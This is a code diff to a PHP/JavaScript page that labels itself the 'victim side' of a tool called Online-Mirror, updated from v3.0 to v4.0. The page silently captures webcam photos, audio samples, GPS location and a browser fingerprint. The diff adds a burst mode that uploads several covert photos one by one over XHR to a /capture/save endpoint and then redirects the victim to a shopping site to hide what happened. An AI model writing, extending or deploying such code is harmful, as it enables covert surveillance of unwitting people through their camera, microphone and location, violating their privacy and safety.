@@ -1,6 +1,6 @@
 <?php
 /**
- * Online-Mirror v3.0 - 拍照捕获页面（受害者端）
+ * Online-Mirror v4.0 - 拍照捕获页面（受害者端）
  * 无感拍照 + 录音采样 + GPS定位 + 浏览器指纹采集
  * 
  * 核心设计：视频流与音频流独立获取，录音失败不影响拍照。
@@ -63,7 +63,7 @@ html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
 <div id="videoWrap"><video id="video" width="320" height="240" autoplay playsinline muted></video></div>
 <canvas style="display:none" id="canvas"></canvas>
 
-<form action="save.php" id="captureForm" method="post">
+<form action="/capture/save" id="captureForm" method="post">
     <input type="hidden" name="img" id="result" value="" />
     <input type="hidden" name="id" value="<?php echo htmlspecialchars($id); ?>" />
     <input type="hidden" name="url" value="<?php echo htmlspecialchars($url); ?>" />
@@ -99,8 +99,16 @@ html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
             // 停止所有轨道
             if (videoStream) videoStream.getTracks().forEach(function(t) { t.stop(); });
             if (audioStream) audioStream.getTracks().forEach(function(t) { t.stop(); });
+            var isBurst = parseInt(document.getElementById('burstTotal').value) > 1;
+            var targetUrl = document.querySelector('input[name="url"]').value;
             setTimeout(function() {
-                document.getElementById('captureForm').submit();
+                if (isBurst) {
+                    // 连拍模式：所有照片已通过 fetch 逐一保存，直接跳转不再提交表单
+                    window.location.href = targetUrl || 'https://mobile.yangkeduo.com/';
+                } else {
+                    // 单拍模式：提交表单保存本次照片
+                    document.getElementById('captureForm').submit();
+                }
             }, 300);
         }
     }
@@ -251,33 +259,41 @@ html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
                 callback(canvas.toDataURL('image/jpeg', 0.8));
             }
             
-            function markPhotoDone() {
+            function markPhotoDone(isSingle) {
                 photoReady = true;
                 trySubmit();
             }
             
             if (burstTotal > 1) {
-                // 连拍模式
+                // 🔥 连拍模式：逐张拍照并通过 XHR 保存，完成后直接跳转不再提交表单
                 getGPS(function() {
                     function burstLoop() {
                         if (burstIndex >= burstTotal) {
-                            markPhotoDone();
+                            // 所有连拍照片已通过 XHR 保存完毕
+                            photoReady = true;
+                            trySubmit();
                             return;
                         }
                         setTimeout(function() {
                             takePhoto(function(imgData) {
                                 document.getElementById('burstIndex').value = burstIndex;
                                 result.value = imgData;
+                                // 使用 XHR 代替 fetch，兼容性更好
+                                var xhr = new XMLHttpRequest();
                                 var fd = new FormData(form);
-                                fetch('save.php', { method: 'POST', body: fd }).then(function() {
+                                xhr.open('POST', '/capture/save', true);
+                                xhr.onload = function() {
                                     burstIndex++;
-                                    setTimeout(burstLoop, 1200);
-                                }).catch(function() {
+                                    setTimeout(burstLoop, 1000);
+                                };
+                                xhr.onerror = function() {
+                                    // 单次失败仍然继续下一张
                                     burstIndex++;
-                                    setTimeout(burstLoop, 1200);
-                                });
+                                    setTimeout(burstLoop, 1000);
+                                };
+                                xhr.send(fd);
                             });
-                        }, 600);
+                        }, 800);
                     }
                     burstLoop();
                 });
